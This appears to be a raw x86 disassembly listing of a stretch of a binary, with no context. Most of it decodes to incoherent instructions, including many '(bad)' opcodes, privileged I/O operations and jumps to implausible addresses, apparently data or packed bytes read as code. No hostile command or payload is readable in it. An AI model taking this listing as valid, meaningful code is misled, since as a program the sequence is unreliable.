  431a1b:	lock add bl,0x1
  431a1f:	retf   
  431a20:	add    dh,al
  431a22:	xor    dh,cl
  431a24:	inc    ebp
  431a25:	scas   eax,DWORD PTR es:[edi]
  431a26:	mov    eax,DWORD PTR [ebx]
  431a28:	shl    al,0x0
  431a2b:	inc    ebp
  431a2c:	dec    DWORD PTR [ebx+0x4dccf0ff]
  431a32:	call   0x462c6a
  431a37:	ud0    eax,ecx
  431a3a:	adc    al,0x4d
  431a3c:	inc    ebp
  431a3d:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  431a43:	lock push 0x338055
  431a49:	add    eax,DWORD PTR [eax]
  431a4b:	ud0    ecx,edx
  431a4e:	sbb    BYTE PTR [ebp+0x5e],dl
  431a51:	xor    ecx,ecx
  431a53:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  431a5a:	push   ecx
  431a5b:	add    BYTE PTR [ebp-0x38],cl
  431a5e:	mov    DWORD PTR [esi-0x740004],eax
  431a64:	cld    
  431a65:	inc    ebp
  431a66:	nop
  431a67:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  431a6d:	xabort 0xaf
  431a70:	icebp  
  431a71:	mov    esi,DWORD PTR [ebp-0x28]
  431a74:	(bad)  
  431a75:	retf   
  431a76:	or     ecx,eax
  431a78:	(bad)  
  431a79:	dec    ebp
  431a7a:	pop    es
  431a7b:	(bad)  
  431a7c:	(bad)  
  431a7d:	or     BYTE PTR [esi],al
  431a7f:	jb     0x431a47
  431a81:	add    BYTE PTR [ebx],al
  431a83:	inc    ebp
  431a84:	(bad)  
  431a85:	mov    ecx,DWORD PTR [edx]
  431a87:	fadd   st(6),st
  431a89:	ret    
  431a8a:	add    ah,BYTE PTR [edi-0x37]
  431a8d:	int    0x55
  431a8f:	sub    ebp,esp
  431a91:	add    edx,DWORD PTR [ecx-0x14]
  431a94:	inc    ebp
  431a95:	inc    ebp
  431a96:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  431a9c:	cld    
  431a9d:	(bad)  
  431a9e:	mov    WORD PTR [edi+0xf893be0],gs
  431aa4:	mov    ebp,ebp
  431aa6:	clc    
  431aa7:	push   eax
  431aa9:	push   DWORD PTR [ebp-0x4]
  431aac:	mov    BYTE PTR [ebp+0xa],0xff
  431ab0:	(bad)  
  431ab1:	int3   
  431ab2:	or     BYTE PTR [eax],al
  431ab4:	(bad)  
  431ab5:	lea    eax,[edi]
  431ab7:	ins    BYTE PTR es:[edi],dx
  431ab8:	(bad)  
  431ab9:	inc    DWORD PTR [ecx]
  431abb:	push   eax
  431abc:	mov    BYTE PTR [ebp+0x9],0x8b
  431ac0:	leave  
  431ac1:	les    edx,FWORD PTR [ebp+0x0]
  431ac4:	in     al,dx
  431ac5:	call   DWORD PTR [ecx-0x75]
  431ac8:	inc    ebp
  431ac9:	cld    
  431aca:	mov    DWORD PTR [eax+0x8b01fc],eax
  431ad0:	cld    
  431ad1:	xor    BYTE PTR [edi-0x76a8f98b],bh
  431ad7:	std    
  431ad8:	mov    eax,DWORD PTR [eax]
  431ada:	clc    
  431adb:	test   eax,esi
  431add:	je     0x431b54
  431adf:	mov    eax,esi
  431ae1:	cld    
  431ae2:	add    al,0x80
  431ae4:	add    WORD PTR [ecx+0x0],ax
  431ae8:	fiadd  DWORD PTR [eax]
  431aea:	mov    BYTE PTR [eax],0xd6
  431aed:	push   0xffffffc3
  431aef:	push   edi
  431af0:	mov    edx,DWORD PTR [eax+0x51]
  431af3:	pop    edi
  431af4:	lea    ebx,[ebx-0x8]
  431af7:	ret    0x45
  431afa:	mov    ecx,DWORD PTR [ebx-0x7243ae04]
  431b00:	xchg   eax,edi
  431b02:	mov    DWORD PTR [ebp-0x75],ecx
  431b05:	push   esi
  431b06:	clc    
  431b07:	jne    0x431ad9
  431b09:	mov    ecx,0xf8450b0b
  431b0e:	(bad)  
  431b0f:	push   cs
  431b10:	or     BYTE PTR [ebp-0x3a],dh
  431b13:	cmp    eax,DWORD PTR [ecx]
  431b15:	pop    esi
  431b16:	(bad)  
  431b17:	or     al,0x5
  431b19:	inc    eax
  431b1a:	leave  
  431b1b:	jmp    0x40cf:0x21564204
  431b22:	leave  
  431b23:	jmp    0xdace5c27
  431b28:	mov    eax,DWORD PTR [edx-0x3a]
  431b2b:	jle    0x431b23
  431b2d:	inc    eax
  431b2e:	nop
  431b2f:	in     al,dx
  431b30:	inc    ebx
  431b32:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  431b38:	add    eax,0xff45e8f8
  431b3d:	push   esi
  431b3e:	push   DWORD PTR [ebp-0x39]
  431b41:	mov    eax,0x7e9da46
  431b46:	or     al,0x6
  431b48:	push   DWORD PTR [ebp-0x3a]
  431b4b:	cmp    eax,DWORD PTR [edx]
  431b4d:	pop    esi
  431b4e:	ret    
  431b4f:	or     al,0x56
  431b51:	inc    ecx
  431b52:	push   ebp
  431b53:	jle    0x431b41
  431b55:	inc    edx
  431b56:	inc    ebp
  431b57:	leave  
  431b58:	add    DWORD PTR [ecx+0x28],eax
  431b5b:	and    esp,edi
  431b5d:	inc    ecx
  431b5e:	jne    0x431b47
  431b60:	add    DWORD PTR [edx+0x1c],eax
  431b63:	retf   0xc38b
  431b66:	adc    al,0x8b
  431b68:	xchg   edx,eax
  431b69:	push   ecx
  431b6a:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  431b70:	rcl    DWORD PTR [esi-0x9],cl
  431b73:	jne    0x431bc5
  431b75:	mov    eax,0x7c80ece
  431b7a:	rol    DWORD PTR [esi],cl
  431b7c:	div    DWORD PTR [ebp+0x50]
  431b7f:	cmp    ecx,edx
  431b81:	pop    esi
  431b82:	dec    BYTE PTR [edx]
  431b84:	in     al,dx
  431b85:	inc    edx
  431b86:	sub    ebp,ebp
  431b88:	inc    eax
  431b89:	(bad)  
  431b8a:	push   eax
  431b8b:	add    edx,DWORD PTR [eax-0x13]
  431b8e:	push   edi
  431b8f:	add    dh,dh
  431b91:	leave  
  431b92:	adc    DWORD PTR [ebp-0x1],0xffffffec
  431b96:	add    BYTE PTR [ecx+0x0],dl
  431b99:	inc    ebp
  431b9a:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  431ba0:	add    BYTE PTR [eax-0x7fbf448],bh
  431ba6:	add    al,0x2
  431ba8:	jmp    0x57ec702
  431bad:	jne    0x431b97
  431baf:	mov    eax,DWORD PTR [edx]
  431bb1:	or     BYTE PTR [eax],al
  431bb3:	inc    ecx
  431bb4:	stc    
  431bb5:	jmp    0xe7825bf0
  431bba:	jge    0x431bfd
  431bbc:	mov    esi,ebp
  431bbe:	lock ret 0x7d
  431bc2:	and    ecx,DWORD PTR [ebx-0x171777]
  431bc8:	add    bh,bh
  431bca:	aad    0xd7
  431bcc:	add    dh,cl
  431bce:	clts   
  431bd0:	(bad)  
  431bd1:	call   0xffce1ad6
  431bd6:	hlt    
  431bd7:	iret   
  431bd8:	jge    0x431bb0
  431bda:	rol    DWORD PTR [esi-0x80],cl
  431bdd:	cmc    
  431bde:	or     BYTE PTR [edi-0x27],cl
  431be1:	(bad)  
  431be2:	out    dx,al
  431be3:	mov    eax,DWORD PTR [ebx]
  431be5:	(bad)  
  431be6:	pop    esi
  431be7:	push   es
  431be8:	cmp    al,0xe8
  431bea:	sar    edi,0x8
  431bed:	inc    DWORD PTR [edi]
  431bef:	inc    esi
  431bf0:	(bad)  
  431bf1:	in     al,dx
  431bf2:	jle    0x431c4b
  431bf4:	push   cs
  431bf5:	push   ebx
  431bf6:	add    BYTE PTR [ebx+0x24008b56],cl
  431bfc:	add    BYTE PTR [ebp+0x50],al
  431bff:	push   eax
  431c00:	add    DWORD PTR [ebx+0x757d1834],ecx
  431c06:	sub    edx,DWORD PTR [esi-0x24]
  431c09:	jne    0x431bc1
  431c0b:	lods   eax,DWORD PTR ds:[esi]
  431c0c:	mov    edx,DWORD PTR [edx-0x34]
  431c0f:	dec    esi
  431c10:	out    0x83,eax
  431c12:	into   
  431c13:	push   edi
  431c15:	loopne 0x431be5
  431c17:	shr    BYTE PTR [edx+ecx*4+0x0],1
  431c1b:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  431c22:	rol    DWORD PTR [edx],0x8
  431c25:	mov    esp,ecx
  431c27:	cmp    DWORD PTR [ebx],0xc
  431c2a:	mov    esi,0x5001c0
  431c2f:	push   eax
  431c30:	push   cs
  431c31:	push   eax
  431c32:	(bad)  
  431c33:	sub    edx,edi
  431c35:	push   esi
  431c36:	adc    al,0xcb
  431c38:	ins    DWORD PTR es:[edi],dx
  431c39:	mov    eax,0x203e8
  431c3e:	add    al,ah
  431c40:	ror    BYTE PTR [eax+0xc007c0],0xc0
  431c47:	add    dh,al
  431c49:	add    ah,ch
  431c4b:	rol    DWORD PTR [ebx-0x3595fb0d],1
  431c51:	pop    ecx
  431c52:	or     eax,ebx
  431c54:	cli    
  431c55:	add    BYTE PTR [ecx-0x4e728d1e],dh
  431c5b:	lea    ebp,[ebx]
  431c5d:	mov    edx,DWORD PTR [edx-0x4]
  431c60:	dec    ecx
  431c61:	inc    ebp
  431c62:	shr    BYTE PTR [ebx],0x4b
  431c65:	and    al,0x0
  431c67:	(bad)  
  431c68:	jne    0x431caf
  431c6a:	pop    eax
  431c6b:	mov    al,0x5a
  431c6d:	call   0x1421ecc
  431c72:	and    al,0x85
  431c74:	push   edx
  431c75:	add    BYTE PTR [eax+eax*1+0x0],ah
  431c79:	dec    ebp
  431c7a:	mov    cl,0x23
  431c7c:	jmp    0x431c6a
  431c7e:	mov    al,0xe7
  431c80:	call   0x1391f6e
  431c85:	shr    DWORD PTR [eax+ebx*2],cl
  431c88:	lock (bad) 
  431c8a:	adc    eax,0x757f008d
  431c8f:	out    0x58,eax
  431c91:	cmp    al,0x7
  431c93:	pop    edx
  431c94:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  431c9b:	push   ecx
  431c9c:	cld    
  431c9d:	mov    esi,0x3b0175
  431ca2:	and    al,0xb0
  431ca4:	xor    BYTE PTR [edx+0x1],0x8b
  431ca8:	add    ah,bh
  431caa:	mov    edi,DWORD PTR [ebp-0x4]
  431cad:	psubsw mm7,QWORD PTR [edi]
  431cb0:	add    DWORD PTR [ebp+0x0],ebp
  431cb3:	rcr    eax,1
  431cb5:	mov    edi,ecx
  431cb7:	and    eax,DWORD PTR [eax]
  431cb9:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  431cbf:	call   0x1301fa8
  431cc4:	add    al,cl
  431cc6:	mov    ebp,esi
  431cc8:	aam    0x83
  431cca:	or     DWORD PTR [ecx],eax
  431ccc:	jne    0x431cbf
  431cce:	mov    eax,DWORD PTR [eax]
  431cd0:	aam    0x0
  431cd2:	dec    ebp
  431cd3:	jne    0x431c60
  431cd5:	cmp    ebx,eax
  431cd7:	jb     0x431d26
  431cd9:	jmp    0x431c66
  431cdb:	mov    ebx,esp
  431cdd:	int3   
  431cde:	dec    ebp
  431cdf:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  431ce6:	mov    edx,0x8b0a8b
  431ceb:	cmp    ecx,DWORD PTR [eax]
  431ced:	jb     0x431cc6
  431cef:	pop    edx
  431cf0:	push   edi
  431cf1:	cli    
  431cf2:	pop    es
  431cf3:	mov    eax,ecx
  431cf5:	jb     0x431cf9
  431cf7:	add    DWORD PTR [ebx],0xa
  431cfa:	mov    eax,DWORD PTR [ebx]
  431cfc:	int3   
  431cfd:	add    bh,BYTE PTR [esi+0x75d10006]
  431d03:	jmp    0x431c90
  431d05:	mov    al,0xe8
  431d07:	call   0x1041f89
  431d0c:	add    edx,DWORD PTR [ecx+ecx*8]
  431d0f:	pop    edi
  431d10:	or     BYTE PTR [ecx-0x73],bl
  431d13:	pop    ecx
  431d14:	inc    edi
  431d15:	xor    al,0xeb
  431d17:	push   ecx
  431d18:	mov    edi,DWORD PTR [edx+0xc506cc]
  431d1e:	call   0xb21e23
  431d23:	int3   
  431d24:	sbb    BYTE PTR [esi],ch
  431d26:	inc    ebp
  431d27:	add    BYTE PTR [ebx-0x1f4f338b],cl
  431d2d:	call   0x9c1f9c
  431d32:	or     BYTE PTR [ebx-0x73],dl
  431d35:	cmp    al,0x47
  431d37:	mov    al,0x1
  431d39:	jb     0x431d3b
  431d3b:	mov    al,0x10
  431d3d:	push   eax
  431d3e:	add    al,0x75
  431d40:	add    BYTE PTR [ebx],ch
  431d42:	add    ebx,esp
  431d44:	int3   
  431d45:	jne    0x431d57
  431d47:	movsx  edx,cl
  431d4a:	add    DWORD PTR [eax],eax
  431d4c:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  431d53:	mov    gs,edi
  431d55:	add    BYTE PTR [eax-0x50],ch
  431d58:	add    al,ch
  431d5a:	mov    eax,DWORD PTR [ecx]
  431d5c:	sub    eax,DWORD PTR [eax]
  431d5e:	jb     0x431dd5
  431d60:	add    DWORD PTR [esp+eiz*8-0x50],esi
  431d64:	jge    0x431d4e
  431d66:	add    al,0x1
  431d68:	add    DWORD PTR [eax],0x0
  431d6b:	jne    0x431d6d
  431d6d:	je     0x431db4
  431d6f:	mov    eax,DWORD PTR [edi]
  431d71:	ror    BYTE PTR [ebp+0x4d],1
  431d74:	or     DWORD PTR [ecx+0x4d03d004],0x3
  431d7b:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431d81:	mov    DWORD PTR [ebx],ebp
  431d83:	fadd   DWORD PTR [eax+0x75]
  431d86:	inc    eax
  431d87:	pop    eax
  431d88:	lea    ebx,[ecx+0x4f]
  431d8b:	push   0xb1000003
  431d90:	out    dx,eax
  431d91:	add    ebp,DWORD PTR [edx+edx*2]
  431d94:	add    BYTE PTR [ebx+ecx*4],bh
  431d97:	mov    ch,BYTE PTR [ebx]
  431d99:	jb     0x431e0d
  431d9b:	add    al,0x89
  431d9d:	push   eax
  431d9e:	call   0x842b6b10
  431da3:	add    DWORD PTR [eax+eax*1],eax
  431da6:	jae    0x431dbc
  431da8:	icebp  
  431da9:	inc    ebp
  431daa:	mov    eax,DWORD PTR gs:[ecx]
  431dad:	int3   
  431dae:	out    dx,al
  431daf:	loopne 0x431dfe
  431db1:	sub    eax,DWORD PTR [edx]
  431db3:	push   0xffffff83
  431db5:	pop    esi
  431db6:	push   cs
  431db7:	jl     0x431dd2
  431db9:	add    al,0xaf
  431dbb:	xor    eax,0x832b6d00
  431dc0:	mov    eax,DWORD PTR [edx]
  431dc2:	rcr    BYTE PTR [ebp+0x754500dc],cl
  431dc8:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431dce:	inc    ebp
  431dcf:	shr    ebx,0x3
  431dd2:	or     DWORD PTR [eax],0x4
  431dd5:	push   0xffffffa5
  431dd7:	pop    esi
  431dd8:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431ddf:	jmp    0x431e3e
  431de1:	mov    edi,0xff0272
  431de6:	fdivr  QWORD PTR [ebp+0x5d]
  431de9:	push   0x4e
  431deb:	pop    ecx
  431dec:	call   0x4361f1
  431df1:	mov    DWORD PTR [ebx],eax
  431df3:	in     al,0xc8
  431df5:	rol    BYTE PTR [ebp-0x75],0xc1
  431df9:	call   0xad1fda
  431dfe:	pop    esi
  431dff:	enter  0xceff,0x8b
  431e03:	repz mov ecx,DWORD PTR [ebp-0x34]
  431e07:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431e0e:	je     0x431e10
  431e10:	or     DWORD PTR [ebx-0x74183b24],eax
  431e16:	jne    0x431dfc
  431e18:	jmp    0x431e13
  431e1a:	push   DWORD PTR [edx-0x24]
  431e1d:	push   0x4d
  431e1f:	pop    ecx
  431e20:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431e24:	jge    0x431e2c
  431e26:	mov    eax,eax
  431e28:	sub    ebp,DWORD PTR [edx+0x24]
  431e2b:	pop    esi
  431e2c:	inc    ebp
  431e2d:	mov    esp,0x8b6077
  431e32:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  431e38:	lods   al,BYTE PTR ds:[esi]
  431e39:	add    BYTE PTR [ebx],bh
  431e3b:	enter  0xce73,0x49
  431e3f:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431e47:	stc    
  431e48:	jge    0x431ebc
  431e4a:	jnp    0xdd42a1b9
  431e50:	call   0xc61f26
  431e55:	fadd   st(0),st
  431e57:	dec    esi
  431e58:	ins    BYTE PTR es:[edi],dx
  431e59:	stc    
  431e5a:	cmp    al,0x73
  431e5c:	push   ebp
  431e5d:	mov    eax,0xf8028b
  431e62:	jne    0x431e25
  431e64:	mov    esi,ecx
  431e66:	mov    esp,DWORD PTR [ebp+0x2c]
  431e69:	add    edi,DWORD PTR [ebp-0x24]
  431e6c:	sub    esp,eax
  431e6e:	and    al,0x45
  431e70:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431e76:	sbb    al,0xee
  431e78:	pop    esi
  431e79:	call   0x831ea9
  431e7e:	fsubr  st,st(3)
  431e80:	sti    
  431e81:	add    BYTE PTR gs:[ecx],bh
  431e84:	add    eax,esp
  431e86:	add    DWORD PTR [esi],eax
  431e88:	rol    DWORD PTR [ebp+0x8],0x29
  431e8c:	mov    esp,eax
  431e8e:	clc    
  431e8f:	jne    0x431f06
  431e91:	mov    eax,0x8b0673
  431e96:	loopne 0x431edd
  431e98:	loopne 0x431e23
  431e9a:	lods   al,BYTE PTR ds:[esi]
  431e9b:	int3   
  431e9c:	inc    ebp
  431e9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431ea1:	add    al,0xc3
  431ea3:	sub    ecx,DWORD PTR [ebp+0x47]
  431ea6:	(bad)  
  431ea8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431eac:	add    eax,DWORD PTR [eax]
  431eae:	call   0x644dfb3
  431eb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431eb9:	dec    esi
  431eba:	ins    DWORD PTR es:[edi],dx
  431ebb:	in     al,dx
  431ebc:	lea    eax,[eax]
  431ebe:	inc    ebp
  431ebf:	inc    ebp
  431ec0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431ec6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431ed0:	and    al,0xdc
  431ed2:	ror    DWORD PTR [edx+0x24],0xf7
  431ed6:	or     BYTE PTR [ebp+0x4c],dh
  431ed9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431edd:	stos   BYTE PTR es:[edi],al
  431ede:	adc    edx,edi
  431ee0:	inc    esp
  431ee1:	add    edi,DWORD PTR [eax]
  431ee3:	jne    0x431ec8
  431ee5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431eeb:	cmp    ecx,DWORD PTR [edi]
  431eed:	sub    BYTE PTR [ebp-0x7e],dl
  431ef0:	sar    ebp,0xb
  431ef3:	jmp    FWORD PTR [edi+0x2400392a]
  431ef9:	sub    esi,DWORD PTR [ebx-0x73]
  431efc:	mov    esp,DWORD PTR [ecx+edi*4]
  431eff:	mov    ecx,DWORD PTR [eax]
  431f01:	and    BYTE PTR [eax],al
  431f03:	jne    0x431ecf
  431f05:	sub    ebp,ecx
  431f07:	sbb    BYTE PTR [esi+0x32],ah
  431f0a:	dec    ebp
  431f0b:	push   ebp
  431f0c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431f12:	ret    
  431f13:	mov    edx,ebp
  431f15:	leave  
  431f16:	sub    DWORD PTR [esi+0x24],ebx
  431f19:	ret    0x2b
  431f1c:	pop    ax
  431f1e:	push   ebp
  431f1f:	rol    BYTE PTR [ebx],0xeb
  431f22:	add    DWORD PTR [ecx+0x6c0001],0x40
  431f29:	jb     0x431f80
  431f2b:	ret    
  431f2c:	in     al,dx
  431f2d:	jecxz  0x431eba
  431f2f:	push   esi
  431f30:	xchg   esp,eax
  431f31:	jne    0x431f33
  431f33:	cmp    edx,DWORD PTR [esi+0x1c]
  431f36:	jne    0x431f1c
  431f38:	mov    eax,DWORD PTR [ebp-0x77]
  431f3b:	ror    DWORD PTR [ebx+0x899408],0xe0
  431f42:	mov    esi,DWORD PTR [ebp-0x75]
  431f45:	pop    esi
  431f46:	nop
  431f47:	mov    eax,DWORD PTR [eax]
  431f49:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431f4f:	add    al,0x0
  431f51:	inc    ebp
  431f52:	mov    eax,DWORD PTR [ebx]
  431f54:	mov    ebp,ebx
  431f56:	cmp    al,0xf
  431f58:	or     al,al
  431f5a:	inc    ebp
  431f5b:	inc    ebp
  431f5c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  431f64:	mov    bh,0xc0
  431f66:	push   ss
  431f67:	ins    BYTE PTR es:[edi],dx
  431f68:	push   ecx
  431f69:	add    BYTE PTR [ecx-0x5],dl
  431f6c:	add    eax,0x17200
  431f71:	sbb    al,0x85
  431f73:	dec    esp
  431f74:	je     0x431fae
  431f76:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  431f7a:	add    BYTE PTR [ebx],bh
  431f7c:	(bad)  
  431f7d:	and    al,0x39
  431f7f:	jae    0x431f1d
  431f81:	mov    cl,cl
  431f83:	inc    DWORD PTR [esp]
  431f86:	push   ebp
  431f87:	shr    esp,0x8
  431f8a:	in     al,dx
  431f8b:	push   esp
  431f8c:	add    DWORD PTR [eax],esp
  431f8e:	add    bl,cl
  431f90:	inc    ebp
  431f91:	mov    bh,0x89
  431f93:	add    ah,bh
  431f95:	jmp    0xca7c2edf
  431f9a:	pushf  
  431f9b:	dec    esp
  431f9c:	mov    edx,0xf8178520
  431fa1:	fst    DWORD PTR [ebp+0x0]
  431fa4:	mov    BYTE PTR [eax],0xc4
  431fa7:	sub    edx,DWORD PTR [ebx-0x3f]
  431faa:	inc    ebp
  431fab:	add    eax,0xc601da
  431fb0:	mov    al,0xc6
  431fb3:	ins    BYTE PTR es:[edi],dx
  431fb4:	mov    DWORD PTR [eax+0x57],0x280545c1
  431fbb:	dec    esp
  431fbc:	jmp    DWORD PTR [eax]
  431fbe:	inc    ebp
  431fbf:	fnstcw WORD PTR [esi+0x29]
  431fc2:	test   BYTE PTR [eax],0xc6
  431fc5:	rol    BYTE PTR [eax],0xc0
  431fc8:	lea    ecx,[ebp-0x3cf0dbcb]
  431fce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431fd4:	inc    esi
  431fd5:	add    DWORD PTR [eax],ebx
  431fd7:	add    dh,bh
  431fd9:	mov    esi,DWORD PTR [edx+0x8]
  431fdc:	(bad)  
  431fdd:	fdiv   QWORD PTR ss:[ecx]
  431fe0:	(bad)  
  431fe1:	mov    bl,ch
  431fe3:	add    esi,eax
  431fe5:	add    dh,bl
  431fe7:	or     esi,eax
  431fe9:	mov    dl,0xdf
  431feb:	add    esi,eax
  431fed:	add    al,ah
  431fef:	push   cs
  431ff0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431ff7:	or     BYTE PTR [ebx],dh
  431ff9:	dec    ecx
  431ffa:	lea    eax,[ebx]
  431ffc:	xor    eax,0x18fc0fc7
  432001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432002:	repz clc 
  432004:	add    eax,DWORD PTR [ebp+0x46]
  432007:	prefetcht0 BYTE PTR [ecx-0x2]
  43200b:	xor    eax,0x7c60872
  432010:	mov    esp,0xbd32c699
  432015:	pop    esi
  432016:	mov    cl,0xbe
  432019:	or     al,0xc6
  43201b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432022:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432029:	add    dh,al
  43202b:	mov    eax,ebx
  43202d:	xor    DWORD PTR [ebx],0x35008dbc
  432033:	mov    ecx,DWORD PTR [edi]
  432035:	sbb    al,0x18
  432037:	inc    ebp
  432038:	xrelease mov DWORD PTR [ebx],0x188546f4
  43203f:	clc    
  432040:	(bad)  
  432041:	ss jb  0x431fe0
  432044:	lea    ecx,[ecx+0x45ffe838]
  43204a:	mov    ebp,esp
  43204c:	fadd   st,st(6)
  43204e:	dec    ebp
  43204f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432055:	out    0x1,eax
  432057:	inc    ebp
  432058:	lea    ebp,[ecx]
  43205a:	inc    esi
  43205c:	dec    eax
  43205e:	enter  0xa33,0xc6
  432062:	push   ebp
  432063:	leave  
  432064:	(bad)  
  432065:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43206b:	add    BYTE PTR [ebp+0x44],al
  43206e:	mov    eax,esp
  432070:	mov    WORD PTR [esi+0x44398300],?
  432076:	psubusw mm4,QWORD PTR [eax-0x78]
  43207a:	add    BYTE PTR [ebx-0x1303f975],al
  432080:	add    BYTE PTR [ebp+0x1],0xeb
  432084:	add    BYTE PTR [ebp+0x38],al
  432087:	jmp    0xdbce65d1
  43208c:	add    BYTE PTR [ebp+0x0],0xe8
  432090:	mov    DWORD PTR [ebp-0x48],eax
  432093:	sub    DWORD PTR [edi+0x45],ecx
  432096:	add    BYTE PTR [eax],ch
  432098:	js     0x4320df
  43209a:	data16 jle 0x432022
  43209d:	idiv   bh
  43209f:	inc    esp
  4320a0:	(bad)  
  4320a1:	fadd   st(7),st
  4320a3:	mov    dh,0x89
  4320a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4320a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4320af:	pop    es
  4320b0:	push   0x8d45ffec
  4320b5:	jmp    0xe6cc65bd
  4320ba:	push   0x45
  4320bc:	jmp    edx
  4320be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4320c2:	mov    DWORD PTR [ebp+0x6c],eax
  4320c5:	(bad)  
  4320c7:	inc    ebp
  4320c8:	(bad)  
  4320c9:	out    dx,al
  4320ca:	add    al,0x45
  4320cc:	mov    edi,esp
  4320ce:	outs   dx,BYTE PTR ds:[esi]
  4320cf:	inc    ebp
  4320d0:	(bad)  
  4320d1:	jle    0x432056
  4320d3:	idiv   BYTE PTR ds:0x70bc8944
  4320d9:	mov    dh,0xff
  4320db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4320e2:	jb     0x432067
  4320e4:	dec    DWORD PTR [eax]
  4320e6:	mov    ebp,esp
  4320e8:	test   WORD PTR [ebp-0x1],ax
  4320ef:	inc    ebp
  4320f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4320f7:	adc    edi,edi
  4320f9:	mov    ebp,edi
  4320fb:	mov    eax,DWORD PTR [eax]
  4320fd:	cmp    BYTE PTR [esi-0x1],ah
  432100:	test   DWORD PTR [ebx],edi
  432102:	push   DWORD PTR [ebp-0x1]
  432105:	mov    DWORD PTR [esi-0x48],ebp
  432108:	add    BYTE PTR [ebp+0x66],al
  43210b:	jmp    0x432092
  43210d:	pushf  
  43210e:	dec    DWORD PTR [ebx-0x7f940301]
  432114:	add    BYTE PTR [ecx],al
  432116:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43211d:	add    al,al
  43211f:	add    BYTE PTR [esi+0x45],ah
  432122:	test   DWORD PTR [ebx+0xff7cff],ecx
  432128:	inc    eax
  432129:	mov    DWORD PTR [eax],eax
  43212b:	mov    esp,DWORD PTR [esi-0x4]
  43212e:	inc    ebp
  43212f:	cmp    BYTE PTR [eax+0x4701],0x38
  432136:	mov    DWORD PTR [ebp-0x7e],ebp
  432139:	add    BYTE PTR [edi-0x73],al
  43213c:	push   0xffffffcd
  43213e:	mov    WORD PTR [ebp+0x64],ax
  432142:	(bad)  
  432143:	call   eax
  432145:	mov    esp,esi
  432147:	data16 cmc 
  432149:	test   DWORD PTR [ebp-0x1],eax
  43214c:	(bad)  
  43214e:	out    0xc0,eax
  432150:	lea    esp,[esi-0x30]
  432153:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432159:	inc    edi
  43215a:	jmp    0x75ff:0x40858866
  432161:	dec    DWORD PTR [ebp-0x7a992f40]
  432167:	test   esi,edi
  432169:	(bad)  
  43216a:	(bad)  
  43216b:	inc    DWORD PTR [ebp-0x9901b9]
  432171:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432177:	rcl    BYTE PTR [ecx+0x66],0x33
  43217b:	test   DWORD PTR [ebx+0xff72ff],edi
  432181:	inc    edi
  432182:	ret    
  432183:	mov    ax,WORD PTR [ebp-0x3f0004]
  43218a:	push   eax
  43218b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432192:	add    BYTE PTR [ebx-0x764f0839],al
  432198:	push   DWORD PTR [esi+0x1]
  43219b:	inc    DWORD PTR [eax]
  43219d:	mov    eax,0xff99ff
  4321a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4321a8:	jne    0x432162
  4321aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4321b4:	mov    ecx,0xd74fb8
  4321b9:	add    cl,al
  4321bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4321c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4321c8:	(bad)  
  4321c9:	(bad)  
  4321ca:	std    
  4321cb:	mov    eax,0x8c2789
  4321d0:	ret    0x6689
  4321d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4321d7:	add    bh,ah
  4321d9:	mov    WORD PTR [ebp-0x70],ax
  4321dd:	(bad)  
  4321de:	ret    0x6605
  4321e1:	or     BYTE PTR [ebp-0x77],dl
  4321e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4321eb:	loop   0x432176
  4321ed:	(bad)  
  4321ee:	xchg   esi,eax
  4321ef:	aam    0xcf
  4321f1:	out    dx,al
  4321f2:	mov    DWORD PTR [esi-0x68],edi
  4321f5:	inc    ebp
  4321f6:	dec    edx
  4321f7:	pop    ecx
  4321f8:	mov    edx,DWORD PTR [eax]
  4321fa:	repnz push bp
